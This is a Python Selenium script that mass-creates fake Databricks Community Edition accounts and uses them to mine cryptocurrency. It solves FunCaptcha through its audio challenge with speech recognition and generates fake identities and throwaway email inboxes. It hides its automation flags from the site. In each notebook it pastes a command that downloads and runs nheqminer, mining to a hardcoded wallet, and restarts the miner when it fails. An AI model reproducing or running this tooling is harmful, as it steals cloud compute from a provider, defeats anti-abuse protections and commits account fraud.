#lop trong cung
import speech_recognition as sr
from selenium import webdriver
from selenium.webdriver import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import urllib.parse
import urllib.request
import requests
import time
import string
import random
import os
import threading
import json
from faker import Faker
faker = Faker()
print('''

  ###########################################################################
           ____            ____              ____            _           _
          |  _ \ ___  _ __|  _ \ __ _ _ __  |  _ \ _ __ ___ (_) ___  ___| |_
          | |_) / _ \| '__| |_) / _` | '__| | |_) | '__/ _ \| |/ _ \/ __| __|
          |  __/ (_) | |  |  __/ (_| | |    |  __/| | | (_) | |  __/ (__| |_
          |_|   \___/|_|  |_|   \__,_|_|    |_|   |_|  \___// |\___|\___|\__|
                                                      |__/
                                                           Not my Idea at all
  ###########################################################################
  ''')
multitab = 15 # vps4-8 chay 20 chrome, vps databricks 2-10 chay max 10-15tab
wallet   ="RDD9mUShEa4WU894zdknpkZJnLbLeWMXf4"
worker   =".Cloud-DB"
scriptmining= "!wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tar.gz && ./nheqminer/nheqminer -v -l eu.luckpool.net:3960 -u "+wallet+worker+" -p x -t 2"
passwork   ="1234Abcdf@"
timeopen=10
timewaiting=10
# Lay captcha va giai ma captcha
def recognizeAudio(audiofilename):
            recognize = sr.Recognizer()
            with sr.AudioFile(audiofilename+'.wav' ) as s:
                data = recognize.record(s)
                raw = recognize.recognize_google(data)
                answer = ''
                for char in raw:
                    if char.isdigit():
                        answer += char
                return answer
def bypass_captcha(driver):
   global captcha
   driver.get("https://api.funcaptcha.com/fc/api/nojs/?pkey=A0DE7B75-1138-44F2-B132-ED188CEB66F3&gametype=audio&lang=en")
   time.sleep(1)
   driver.find_element_by_xpath('//*[@id="verifyButton"]').click()
   time.sleep(1)
   driver.find_element_by_name("audio_mode").click()
   time.sleep(2)
   href=driver.find_element_by_xpath('//*[@id="downloadButton"]').get_attribute('href')
   getcaptchaAudio = requests.get(href)
   audiornd = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 7))
   open(f'{os.getcwd()}\{audiornd}'+'.wav', 'wb+').write(getcaptchaAudio.content)
   n=0
   while True:
      captcha=recognizeAudio(f'{os.getcwd()}\{audiornd}')
      n=n+1
      if len(captcha)==7 or n>5:
         break
   driver.find_element_by_xpath('//*[@id="audioGuess"]').send_keys(captcha)
   time.sleep(2)
   driver.find_element_by_xpath('//*[@id="audioVerify"]').click()
   time.sleep(5)
   action=driver.find_element_by_xpath('/html/body/div/form/div/div/input').get_attribute('value')
   return action
# Tao acc Databricks
def regdatabricks(driver,gmail,firstname,lastname,company,title):
  print("Mail :",gmail)
  bypass2=bypass_captcha(driver)
  print("Captcha: ",bypass2)
  url = 'https://databricks.com/wp-content/themes/databricks/try-handler-v1.1.php'
  user_agent = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)'
  values ={ 'arkose_token_response': bypass2,'mkto_form_consent': 'yes','only_whitelisted_emails':'','workspace_type': 'CE','FirstName': firstname,'LastName': lastname,'Company': company,'Email': gmail,'Title': title,'Phone':'','useCase':'','role':'','mkto_form_consent_ce':'','UTM_Source__c':'','UTM_Campaign__c':'','UTM_Medium__c':'','UTM_Offer__c':'','UTM_Content__c':'','UTM_Keyword__c':'','returnURL':'','First_Touch_Source__c': 'Clicked CE','ITM__c':'','trialType': 'Clicked CE','action': 'try_platform_ce'}
  headers = {'User-Agent': user_agent}
  data = urllib.parse.urlencode(values)
  data = data.encode('ascii')
  req = urllib.request.Request(url, data, headers)
  try: urllib.request.urlopen(req)
  except urllib.error.URLError as e:
     print(e.reason)
def checkmail(email):
    name=(email.split("@"))[0]
    address=(email.split("@"))[1]
    urlcheck="https://www.1secmail.com/api/v1/?action=getMessages&login="+name+"&domain="+address
    rep=requests.get(urlcheck)
    idmail=((rep.json())[0]["id"])
    urlmailbox="https://www.1secmail.com/api/v1/?action=readMessage&login="+name+"&domain="+address+"&id="+str(idmail)
    checkmail=requests.get(urlmailbox)
    bodytext=((checkmail.json()))["body"]
    linkreset=(bodytext[404:564])#===>địa chỉ resetpass
    if linkreset != '':
      return (linkreset)
    else: return("Error")
def resetpass(linkreset,driver,waiting):
    driver.get(linkreset)
    time.sleep(5)
    driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[1]/input').send_keys(passwork)
    driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[2]/input').send_keys(passwork)
    time.sleep(1)
    driver.find_element_by_xpath('//*[@id="reset-container"]/div/div[3]/button').click()
    print("Chrome",waiting,"Login OK...")
def autodatabricks(driver,waiting):
 time.sleep(20)
 print("Chrome",waiting,":Setup Note")
 driver.find_element_by_xpath('//*[@id="content"]/div/div/uses-legacy-bootstrap/div/div/div[2]/div[3]/div[1]/div[3]/div/div/div/a/div[2]').click()
 time.sleep(4)
 cluster= "Chrome "+str(waiting)
 driver.find_element_by_xpath('//*[@id="input"]').send_keys(cluster)
 time.sleep(4)
 driver.find_element_by_xpath('/html/body/div[8]/div/div/uses-legacy-bootstrap/uses-legacy-bootstrap/button[2]').click()
 time.sleep(15)
 driver.find_element_by_css_selector(".CodeMirror-line").click()
 driver.find_element_by_css_selector(".CodeMirror textarea").send_keys(scriptmining)
 driver.find_element_by_css_selector(".fa-play").click()
 driver.find_element_by_css_selector(".run-cell > .fa").click()
 driver.find_element_by_xpath("/html/body/uses-legacy-bootstrap[14]/div/uses-legacy-bootstrap/div/div[1]/div/div/input").click()
 driver.find_element_by_xpath('/html/body/uses-legacy-bootstrap[14]/div/uses-legacy-bootstrap/div/div[3]/div/a[2]').click()
 time.sleep(4)
 driver.minimize_window()
 clearConsole()
 print("Chrome",waiting,"Start Mining Coin .....")
 while (True):
     time.sleep(120)
     driver.refresh()
     clearConsole()
     time.sleep(10)
     print("Chrome",waiting,"Check vps")
     checkerror=checkvps(driver,'//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[1]/div[2]/div[2]/div/div[3]/div[2]')
     if driver.title == "Login - Databricks Community Edition" :
          print("Chrome :",waiting,"Databricks logout")
          driver.quit()
          newauto(waiting)
     if checkerror==True :
         time.sleep(1)
         texterror = driver.find_element_by_xpath('//*[@id="content"]/section/main/uses-legacy-bootstrap[1]/div/div[2]/div[1]/div[2]/div[2]/div/div[3]/div[2]/div[1]/div/div/div/div').text
         time.sleep(1)
         datatext = texterror.split(":")
         if len(datatext)>2 :
           time.sleep(1)
           errortext= (datatext[0]+":",datatext[1])
           time.sleep(1)
           if errortext =="Cancel Waiting for cluster to start: Unexpected failure during launch. databricks_error_message" :
              print("Chrome",waiting,"ERROR ==>",errortext)
              driver.find_element_by_xpath('//*[@id="stopExecution"]').click()
              time.sleep(5)
              driver.find_element_by_css_selector(".fa-play").click()
              driver.find_element_by_css_selector(".run-cell > .fa").click()
         if texterror == "The spark driver has stopped unexpectedly and is restarting. Your notebook will be automatically reattached.":
            print("Chrome",waiting,"ERROR ==> The spark driver has stopped unexpectedly and is restarting. Your notebook will be automatically reattached.")
            driver.find_element_by_css_selector(".fa-play").click()
            driver.find_element_by_css_selector(".run-cell > .fa").click()
         if texterror == "Internal error, sorry. Attach your notebook to a different cluster or restart the current cluster.":
            print("Chrome",waiting,"ERROR ==>Internal error, sorry. Attach your notebook to a different cluster or restart the current cluster.")
            driver.find_element_by_css_selector(".fa-play").click()
            driver.find_element_by_css_selector(".run-cell > .fa").click()
         if texterror == "Cancelled":
            print("Chrome",waiting,"ERROR ==> Cancelled")
            driver.find_element_by_css_selector(".fa-play").click()
            driver.find_element_by_css_selector(".run-cell > .fa").click()
         if texterror == "":
            print("Chrome",waiting,"ERROR ==> STOP VPS")
            driver.find_element_by_css_selector(".fa-play").click()
            driver.find_element_by_css_selector(".run-cell > .fa").click()
     print("Chrome",waiting,driver.title)
     print("Chrome",waiting,"Running Miner Coin...")
def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):
        command = 'cls'
    os.system(command)
def checkvps(driver,xpath):
    try:
        element = driver.find_element_by_xpath(xpath)
    except NoSuchElementException as e:
        return False
    return True

def autominer(waiting):
   option = webdriver.ChromeOptions()
   option.add_experimental_option("excludeSwitches", ["enable-automation"])
   option.add_experimental_option('useAutomationExtension', False)
   option.add_argument('--disable-blink-features=AutomationControlled')
   option.add_argument('--no-sandbox')
   #option.add_argument('--headless')
   option.add_argument('--disable-dev-shm-usage')
   drivers = webdriver.Chrome(executable_path="chromedriver",options=option)
   drivers.set_window_size(800, 1200)
   drivers.minimize_window()
   firstname=faker.first_name()
   lastname=faker.last_name()
   title= faker.state()
   company=faker.company()
   url="https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
   req = requests.get(url)
   gmail=(req.json())[0] 
   try:
      global linkreset
      regdatabricks(drivers,gmail,firstname,lastname,company,title)
      time.sleep(20)
      linkreset = checkmail(gmail)
      print(linkreset)
      resetpass(linkreset,drivers,waiting)
      autodatabricks(drivers,waiting)
   except :
     print("Error")
     drivers.close()
     drivers.quit()
     time.sleep(timewaiting)
     reauto(waiting)

def auto(waiting):
     autominer(waiting)

def newauto(waiting):
       auto(waiting)
def reauto(waiting):
       auto(waiting)

def multichrome(l):
    print("Start Chrome",l,":Runing...")
    auto(l)
def startauto():
    threads =[]
    for l in range(multitab):
        threads += [threading.Thread(target=multichrome,args={l})]
    for t in threads:
        t.start()
        time.sleep(timeopen)
    for t in threads:
        t.join()
    print("End Multi Chrome Tab")
startauto()
